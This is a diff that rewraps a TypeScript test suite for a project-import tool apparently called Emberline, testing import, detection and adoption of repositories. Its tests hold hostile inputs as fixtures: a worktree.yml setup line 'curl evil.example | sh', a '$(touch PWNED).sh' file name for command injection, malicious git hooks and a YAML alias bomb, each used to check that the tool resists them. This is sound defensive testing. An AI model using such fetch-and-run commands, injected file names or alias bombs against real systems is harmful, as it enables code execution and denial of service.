@@ -1,6 +1,15 @@
 import { execFileSync } from 'node:child_process';
 import { createHash } from 'node:crypto';
-import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import {
+  existsSync,
+  mkdirSync,
+  mkdtempSync,
+  readdirSync,
+  readFileSync,
+  rmSync,
+  symlinkSync,
+  writeFileSync,
+} from 'node:fs';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
 import {
@@ -70,16 +79,29 @@ function onlyGitObjectReads(list: readonly ExecRequest[]): boolean {
     if (e.file !== 'git') return false;
     if (e.args[0] === '-C' && e.args[2] === 'config' && e.args[3] === '--list') return true;
     const hardened = HARDENED_GIT_ARGS.every((a, i) => e.args[i] === a);
-    return hardened && ['ls-tree', 'cat-file'].includes(e.args[n] ?? '') && !e.args.includes('--textconv') && !e.args.includes('--filters');
+    return (
+      hardened &&
+      ['ls-tree', 'cat-file'].includes(e.args[n] ?? '') &&
+      !e.args.includes('--textconv') &&
+      !e.args.includes('--filters')
+    );
   });
 }
 
-const api = (method: 'GET' | 'POST', url: string, payload?: object) => t.app.inject({ method, url, headers, payload });
+const api = (method: 'GET' | 'POST', url: string, payload?: object) =>
+  t.app.inject({ method, url, headers, payload });
 const git = (cwd: string, ...args: string[]) =>
-  execFileSync('git', ['-c', 'user.name=T', '-c', 'user.email=t@t', ...args], { cwd, encoding: 'utf8' }).trim();
+  execFileSync('git', ['-c', 'user.name=T', '-c', 'user.email=t@t', ...args], {
+    cwd,
+    encoding: 'utf8',
+  }).trim();
 
 /** A folder in the workspaces dir with `files`, committed on `branch` unless `git: false`. */
-function fixture(name: string, files: Record<string, string>, opts: { git?: boolean; branch?: string; remote?: string; commit?: boolean } = {}): string {
+function fixture(
+  name: string,
+  files: Record<string, string>,
+  opts: { git?: boolean; branch?: string; remote?: string; commit?: boolean } = {},
+): string {
   const dir = path.join(ws, name);
   mkdirSync(dir, { recursive: true });
   for (const [rel, content] of Object.entries(files)) {
@@ -183,7 +205,12 @@ describe('GET /api/workspaces/folders', () => {
 describe('legacy create', () => {
   it('refuses an existing non-empty directory instead of writing into it', async () => {
     const dir = fixture('legacy', { 'PROJECT.md': '# Theirs\n' }, { git: false });
-    const res = await api('POST', '/api/projects', { name: 'Legacy', mode: 'wizard', appType: 'web_saas', description: 'x' });
+    const res = await api('POST', '/api/projects', {
+      name: 'Legacy',
+      mode: 'wizard',
+      appType: 'web_saas',
+      description: 'x',
+    });
     expect(res.statusCode).toBe(409);
     expect(readFileSync(path.join(dir, 'PROJECT.md'), 'utf8')).toBe('# Theirs\n');
     expect(existsSync(path.join(dir, '.git'))).toBe(false);
@@ -218,7 +245,10 @@ describe('create source import_folder', () => {
     const dir = fixture('shop', PNPM_APP);
     const project = await imported('shop');
     expect(readProjectSettings(t.db, project.id).importSource).toBe('folder');
-    const listed = (await api('GET', '/api/projects')).json() as Array<{ id: string; importSource?: string | null }>;
+    const listed = (await api('GET', '/api/projects')).json() as Array<{
+      id: string;
+      importSource?: string | null;
+    }>;
     expect(listed.find((p) => p.id === project.id)?.importSource).toBe('folder');
 
     const del = await t.app.inject({ method: 'DELETE', url: `/api/projects/${project.id}`, headers });
@@ -229,21 +259,36 @@ describe('create source import_folder', () => {
 
     // Only an explicit deleteFiles deletes the folder.
     const again = await imported('shop');
-    const purge = await t.app.inject({ method: 'DELETE', url: `/api/projects/${again.id}?deleteFiles=1`, headers });
+    const purge = await t.app.inject({
+      method: 'DELETE',
+      url: `/api/projects/${again.id}?deleteFiles=1`,
+      headers,
+    });
     expect(purge.statusCode).toBe(200);
     expect(existsSync(dir)).toBe(false);
   });
 
   it('a project Emberline created is "new" and its folder goes by default', async () => {
-    const res = await api('POST', '/api/projects', { name: 'Fresh', source: 'new', appType: 'static_site', presetId: 'static-plain', vision: 'A page.', startFactory: false });
+    const res = await api('POST', '/api/projects', {
+      name: 'Fresh',
+      source: 'new',
+      appType: 'static_site',
+      presetId: 'static-plain',
+      vision: 'A page.',
+      startFactory: false,
+    });
     expect(res.statusCode, res.body).toBe(201);
     const { project } = res.json() as CreateProjectResponse;
     expect(readProjectSettings(t.db, project.id).importSource).toBe('new');
-    expect((await t.app.inject({ method: 'DELETE', url: `/api/projects/${project.id}`, headers })).statusCode).toBe(200);
+    expect(
+      (await t.app.inject({ method: 'DELETE', url: `/api/projects/${project.id}`, headers })).statusCode,
+    ).toBe(200);
     expect(existsSync(project.path)).toBe(false);
 
     const legacy = await api('POST', '/api/projects', { name: 'Legacy Blank', initGit: false });
-    expect(readProjectSettings(t.db, (legacy.json() as CreateProjectResponse).project.id).importSource).toBe('new');
+    expect(readProjectSettings(t.db, (legacy.json() as CreateProjectResponse).project.id).importSource).toBe(
+      'new',
+    );
   });
 
   it('409 when the folder is already a project', async () => {
@@ -324,7 +369,12 @@ describe('GET /api/projects/:id/detect', () => {
     expect(existsSync(path.join(dir, 'node_modules'))).toBe(false);
 
     expect(detected.appType).toBe('web_saas');
-    expect(detected.choices).toMatchObject({ frontend: 'react-vite', language: 'typescript-node', styling: 'tailwind', auth: 'agent' });
+    expect(detected.choices).toMatchObject({
+      frontend: 'react-vite',
+      language: 'typescript-node',
+      styling: 'tailwind',
+      auth: 'agent',
+    });
     // Vitest alone is no web_saas option: kept as free text instead of a wrong id
     expect(detected.choices.testing).toEqual({ other: 'Vitest' });
     expect(detected.commands).toEqual({
@@ -334,7 +384,12 @@ describe('GET /api/projects/:id/detect', () => {
       test: 'pnpm run test -- --run',
       services: [{ name: 'web', command: 'pnpm dev', preview: true }],
     });
-    expect(detected.files).toEqual({ projectMd: false, claudeMd: false, agentsMd: false, worktreeYml: false });
+    expect(detected.files).toEqual({
+      projectMd: false,
+      claudeMd: false,
+      agentsMd: false,
+      worktreeYml: false,
+    });
     expect(detected.worktreeYml).toBeNull();
     expect(suggestions.projectMd).toContain('# Imported shop');
     expect(suggestions.projectMd).toContain('React + Vite');
@@ -361,7 +416,11 @@ describe('GET /api/projects/:id/detect', () => {
   });
 
   it('file names in a detected command are shell-quoted: a crafted name never runs', async () => {
-    const dir = fixture('scripts', { '$(touch PWNED).sh': 'echo hi\n', 'my script.sh': 'echo hi\n', "it's.sh": 'echo hi\n' });
+    const dir = fixture('scripts', {
+      '$(touch PWNED).sh': 'echo hi\n',
+      'my script.sh': 'echo hi\n',
+      "it's.sh": 'echo hi\n',
+    });
     const { detected, suggestions } = await detect((await imported('scripts')).id);
     const build = detected.commands.build ?? '';
     expect(build).toContain("'$(touch PWNED).sh'");
@@ -377,7 +436,12 @@ describe('GET /api/projects/:id/detect', () => {
     fixture('bakery', STATIC_SITE);
     const { detected, suggestions } = await detect((await imported('bakery')).id);
     expect(detected.appType).toBe('static_site');
-    expect(detected.choices).toMatchObject({ frontend: 'plain-html', backend: 'none', database: 'none', language: 'javascript' });
+    expect(detected.choices).toMatchObject({
+      frontend: 'plain-html',
+      backend: 'none',
+      database: 'none',
+      language: 'javascript',
+    });
     expect(detected.commands).toEqual({
       setup: [],
       services: [{ name: 'web', command: 'python3 -m http.server $PORT --bind 0.0.0.0', preview: true }],
@@ -451,7 +515,12 @@ describe('GET /api/projects/:id/detect', () => {
     writeFileSync(path.join(dir, '.emberline/worktree.yml'), OWN_WORKTREE_YML);
     const { detected, suggestions } = await detect((await imported('fw')).id);
     expect(detected.files.worktreeYml).toBe(true);
-    expect(detected.worktreeYml).toMatchObject({ content: null, sha256: null, notCommitted: true, workingTreeDiffers: true });
+    expect(detected.worktreeYml).toMatchObject({
+      content: null,
+      sha256: null,
+      notCommitted: true,
+      workingTreeDiffers: true,
+    });
     expect(suggestions.worktreeYml).toBeUndefined();
   });
 
@@ -465,7 +534,10 @@ describe('GET /api/projects/:id/detect', () => {
 
   it('does not follow a symlinked package.json', async () => {
     const outside = mkdtempSync(path.join(tmpdir(), 'pkg-'));
-    writeFileSync(path.join(outside, 'package.json'), JSON.stringify({ scripts: { build: 'x' }, dependencies: { next: '1' } }));
+    writeFileSync(
+      path.join(outside, 'package.json'),
+      JSON.stringify({ scripts: { build: 'x' }, dependencies: { next: '1' } }),
+    );
     const dir = fixture('trick', { 'index.html': '<p>' });
     symlinkSync(path.join(outside, 'package.json'), path.join(dir, 'package.json'));
     const { detected } = await detect((await imported('trick')).id);
@@ -511,7 +583,10 @@ describe('POST /api/projects/:id/adopt', () => {
     expect(git(dir, 'diff', '--cached', '--name-only')).toBe('index.html');
     expect(git(remote, 'rev-parse', 'trunk')).toBe(remoteHead);
 
-    expect(readProjectSettings(t.db, project.id)).toMatchObject({ gates: { antiSlopGate: false }, choices: { frontend: 'react-vite' } });
+    expect(readProjectSettings(t.db, project.id)).toMatchObject({
+      gates: { antiSlopGate: false },
+      choices: { frontend: 'react-vite' },
+    });
     expect(t.db.select().from(projectWorktreeConfig).all()).toEqual([]);
     expect(t.tickets.list(project.id)).toEqual([]);
     rmSync(remote, { recursive: true, force: true });
@@ -531,7 +606,11 @@ describe('POST /api/projects/:id/adopt', () => {
   it('a worktree.yml Emberline writes is approved; preview shows exactly what adopt writes', async () => {
     const dir = fixture('shop', PNPM_APP);
     const project = await imported('shop');
-    const body: AdoptProjectBody = { write: ['projectMd', 'claudeMd', 'worktreeYml'], choices: { frontend: 'react-vite' }, appType: 'web_saas' };
+    const body: AdoptProjectBody = {
+      write: ['projectMd', 'claudeMd', 'worktreeYml'],
+      choices: { frontend: 'react-vite' },
+      appType: 'web_saas',
+    };
     const pv = await api('POST', `/api/projects/${project.id}/adopt/preview`, body);
     expect(pv.statusCode, pv.body).toBe(200);
     const preview = pv.json() as AdoptPreviewResponse;
@@ -541,14 +620,23 @@ describe('POST /api/projects/:id/adopt', () => {
     const out = (await adopt(project.id, body)).json() as AdoptProjectResponse;
     expect(out.files).toEqual(preview.files);
     expect(Object.keys(out.files).sort()).toEqual(['.emberline/worktree.yml', 'CLAUDE.md', 'PROJECT.md']);
-    for (const [rel, content] of Object.entries(out.files)) expect(readFileSync(path.join(dir, rel), 'utf8')).toBe(content);
+    for (const [rel, content] of Object.entries(out.files))
+      expect(readFileSync(path.join(dir, rel), 'utf8')).toBe(content);
     expect(out.files['PROJECT.md']).toContain('React + Vite');
     expect(out.worktreeConfig).toBe('generated');
-    const row = t.db.select().from(projectWorktreeConfig).where(eq(projectWorktreeConfig.projectId, project.id)).get();
+    const row = t.db
+      .select()
+      .from(projectWorktreeConfig)
+      .where(eq(projectWorktreeConfig.projectId, project.id))
+      .get();
     expect(row?.content).toBe(out.files['.emberline/worktree.yml']);
     expect(row?.approvedBy).toBe('wizard');
     expect(t.db.select().from(projects).where(eq(projects.id, project.id)).get()?.appType).toBe('web_saas');
-    expect(git(dir, 'show', '--name-only', '--format=', 'HEAD').split('\n').sort()).toEqual(['.emberline/worktree.yml', 'CLAUDE.md', 'PROJECT.md']);
+    expect(git(dir, 'show', '--name-only', '--format=', 'HEAD').split('\n').sort()).toEqual([
+      '.emberline/worktree.yml',
+      'CLAUDE.md',
+      'PROJECT.md',
+    ]);
   });
 
   it("the repo's own worktree.yml is approved only when ticked, unchanged and valid", async () => {
@@ -570,7 +658,12 @@ describe('POST /api/projects/:id/adopt', () => {
     expect(ok.statusCode, ok.body).toBe(200);
     expect((ok.json() as AdoptProjectResponse).worktreeConfig).toBe('existing');
     const row = t.db.select().from(projectWorktreeConfig).get();
-    expect(row).toMatchObject({ projectId: project.id, content: OWN_WORKTREE_YML, sha256: sha, approvedBy: 'import' });
+    expect(row).toMatchObject({
+      projectId: project.id,
+      content: OWN_WORKTREE_YML,
+      sha256: sha,
+      approvedBy: 'import',
+    });
   });
 
   it('an invalid worktree.yml is never approved: 400 with the schema errors', async () => {
@@ -604,7 +697,10 @@ describe('POST /api/projects/:id/adopt', () => {
 
   it("approves the HEAD blob, never the working tree's edit", async () => {
     const dir = fixture('fw', REPO_WITH_FILES);
-    writeFileSync(path.join(dir, '.emberline/worktree.yml'), 'version: 1\nsetup:\n  - curl evil.example | sh\n');
+    writeFileSync(
+      path.join(dir, '.emberline/worktree.yml'),
+      'version: 1\nsetup:\n  - curl evil.example | sh\n',
+    );
     const project = await imported('fw');
     const sha = (await detect(project.id)).detected.worktreeYml?.sha256 ?? '';
     const ok = await adopt(project.id, { approveWorktreeYml: true, worktreeYmlSha256: sha });
@@ -640,7 +736,9 @@ describe('POST /api/projects/:id/adopt', () => {
   it('repo hooks never run and repo config cannot forge the author', async () => {
     const dir = fixture('shop', PNPM_APP);
     for (const hook of ['pre-commit', 'post-commit', 'commit-msg', 'prepare-commit-msg']) {
-      writeFileSync(path.join(dir, '.git', 'hooks', hook), `#!/bin/sh\ntouch "${dir}/PWNED-${hook}"\n`, { mode: 0o755 });
+      writeFileSync(path.join(dir, '.git', 'hooks', hook), `#!/bin/sh\ntouch "${dir}/PWNED-${hook}"\n`, {
+        mode: 0o755,
+      });
     }
     for (const [key, value] of [
       ['user.name', 'evil'],
@@ -681,7 +779,10 @@ describe('POST /api/projects/:id/adopt', () => {
     expect(out.warning).toMatch(/committed/);
     expect(out.commitSha).toBe(git(dir, 'rev-parse', 'HEAD'));
     expect(commitsOf(dir)[0]).toBe('chore: add Emberline project files');
-    expect(error).toHaveBeenCalledWith(expect.objectContaining({ projectId: project.id }), expect.any(String));
+    expect(error).toHaveBeenCalledWith(
+      expect.objectContaining({ projectId: project.id }),
+      expect.any(String),
+    );
   });
 
   it('rejects choices that do not exist', async () => {
@@ -696,15 +797,28 @@ describe('POST /api/projects/:id/adopt', () => {
 describe('GET /api/projects/:id/import-status without the runner', () => {
   it('answers 503 when ptyd is unreachable and the folder cannot tell', async () => {
     const id = 'p-unreachable';
-    t.db.insert(projects).values({
-      id, name: 'Away', slug: 'away', repoUrl: 'https://example.com/a.git', defaultBranch: 'main',
-      path: path.join(ws, 'away'), appType: 'custom', description: '', techStack: null, createdAt: new Date(),
-    }).run();
+    t.db
+      .insert(projects)
+      .values({
+        id,
+        name: 'Away',
+        slug: 'away',
+        repoUrl: 'https://example.com/a.git',
+        defaultBranch: 'main',
+        path: path.join(ws, 'away'),
+        appType: 'custom',
+        description: '',
+        techStack: null,
+        createdAt: new Date(),
+      })
+      .run();
     const down = await api('GET', `/api/projects/${id}/import-status`);
     expect(down.statusCode).toBe(503);
     expect(down.json().error).toBe('ptyd_unavailable');
     // a client that is connected but times out is the same answer, not a raw 500
-    vi.spyOn(t.ptyd, 'get').mockReturnValue({ list: () => Promise.reject(new Error('ptyd did not answer list')) } as never);
+    vi.spyOn(t.ptyd, 'get').mockReturnValue({
+      list: () => Promise.reject(new Error('ptyd did not answer list')),
+    } as never);
     const timeout = await api('GET', `/api/projects/${id}/import-status`);
     expect(timeout.statusCode).toBe(503);
     expect(timeout.json().error).toBe('ptyd_unavailable');
@@ -728,17 +842,29 @@ describe('GET /api/projects/:id/import-status', () => {
   async function importUrl(name: string, replace: (dest: string) => { file: string; args: string[] }) {
     const client = t.ptyd.get();
     const spawn = client.spawn.bind(client);
-    vi.spyOn(client, 'spawn').mockImplementation((params) => spawn({ ...params, ...replace(params.args?.at(-1) ?? '') }));
-    const res = await api('POST', '/api/projects', { name, source: 'import_url', repoUrl: 'https://example.com/x.git' });
+    vi.spyOn(client, 'spawn').mockImplementation((params) =>
+      spawn({ ...params, ...replace(params.args?.at(-1) ?? '') }),
+    );
+    const res = await api('POST', '/api/projects', {
+      name,
+      source: 'import_url',
+      repoUrl: 'https://example.com/x.git',
+    });
     expect(res.statusCode, res.body).toBe(201);
     return res.json() as CreateProjectResponse;
   }
-  const status = async (id: string) => (await api('GET', `/api/projects/${id}/import-status`)).json() as ImportStatusResponse;
+  const status = async (id: string) =>
+    (await api('GET', `/api/projects/${id}/import-status`)).json() as ImportStatusResponse;
 
   it('ready once the clone exited 0 and the folder has a HEAD', async () => {
     const source = fixture('source', STATIC_SITE);
-    const { project, terminalId } = await importUrl('Cloned', (dest) => ({ file: 'git', args: ['clone', '--progress', '--', source, dest] }));
-    await vi.waitFor(async () => expect((await status(project.id)).status).toBe('ready'), { timeout: 10_000 });
+    const { project, terminalId } = await importUrl('Cloned', (dest) => ({
+      file: 'git',
+      args: ['clone', '--progress', '--', source, dest],
+    }));
+    await vi.waitFor(async () => expect((await status(project.id)).status).toBe('ready'), {
+      timeout: 10_000,
+    });
     const s = await status(project.id);
     expect(s).toMatchObject({ status: 'ready', exitCode: 0, terminalId });
     expect(s.tail).toContain('Cloning');
@@ -746,11 +872,18 @@ describe('GET /api/projects/:id/import-status', () => {
 
   it("once cloned, the default branch is the clone's checked-out branch (runs merge into it)", async () => {
     const source = fixture('source', STATIC_SITE, { branch: 'trunk' });
-    const { project } = await importUrl('Cloned Trunk', (dest) => ({ file: 'git', args: ['clone', '--progress', '--', source, dest] }));
+    const { project } = await importUrl('Cloned Trunk', (dest) => ({
+      file: 'git',
+      args: ['clone', '--progress', '--', source, dest],
+    }));
     expect(project.defaultBranch).toBe('main');
     expect(readProjectSettings(t.db, project.id).importSource).toBe('url');
-    await vi.waitFor(async () => expect((await status(project.id)).status).toBe('ready'), { timeout: 10_000 });
-    expect(t.db.select().from(projects).where(eq(projects.id, project.id)).get()?.defaultBranch).toBe('trunk');
+    await vi.waitFor(async () => expect((await status(project.id)).status).toBe('ready'), {
+      timeout: 10_000,
+    });
+    expect(t.db.select().from(projects).where(eq(projects.id, project.id)).get()?.defaultBranch).toBe(
+      'trunk',
+    );
   });
 
   it('failed with the exit code and the tail when the clone fails', async () => {
@@ -758,7 +891,9 @@ describe('GET /api/projects/:id/import-status', () => {
       file: 'git',
       args: ['clone', '--', path.join(ws, 'does-not-exist'), dest],
     }));
-    await vi.waitFor(async () => expect((await status(project.id)).status).toBe('failed'), { timeout: 10_000 });
+    await vi.waitFor(async () => expect((await status(project.id)).status).toBe('failed'), {
+      timeout: 10_000,
+    });
     const s = await status(project.id);
     expect(s.exitCode).toBe(128);
     expect(s.tail).toMatch(/fatal/);
@@ -788,12 +923,20 @@ describe('GET /api/projects/:id/import-status', () => {
 describe('parseWorktreeYml', () => {
   it('reports YAML and schema errors and refuses alias bombs', async () => {
     const { parseWorktreeYml } = await import('./worktree-config/load.js');
-    expect(parseWorktreeYml(OWN_WORKTREE_YML)).toMatchObject({ ok: true, config: { setup: ['make deps'], checks: { build: 'make' } } });
+    expect(parseWorktreeYml(OWN_WORKTREE_YML)).toMatchObject({
+      ok: true,
+      config: { setup: ['make deps'], checks: { build: 'make' } },
+    });
     expect(parseWorktreeYml('version: [1')).toMatchObject({ ok: false });
     const schema = parseWorktreeYml('version: 1\nextra: true\n');
     expect(schema.ok).toBe(false);
     const levels = ['a: &a ["x","x","x","x","x","x","x","x","x"]'];
-    for (let i = 1; i < 10; i++) levels.push(`${String.fromCharCode(97 + i)}: &${String.fromCharCode(97 + i)} [${Array(9).fill(`*${String.fromCharCode(96 + i)}`).join(',')}]`);
+    for (let i = 1; i < 10; i++)
+      levels.push(
+        `${String.fromCharCode(97 + i)}: &${String.fromCharCode(97 + i)} [${Array(9)
+          .fill(`*${String.fromCharCode(96 + i)}`)
+          .join(',')}]`,
+      );
     const bomb = parseWorktreeYml(`${levels.join('\n')}\nversion: 1\n`);
     expect(bomb.ok).toBe(false);
     // refused while expanding, before the schema sees the extra keys
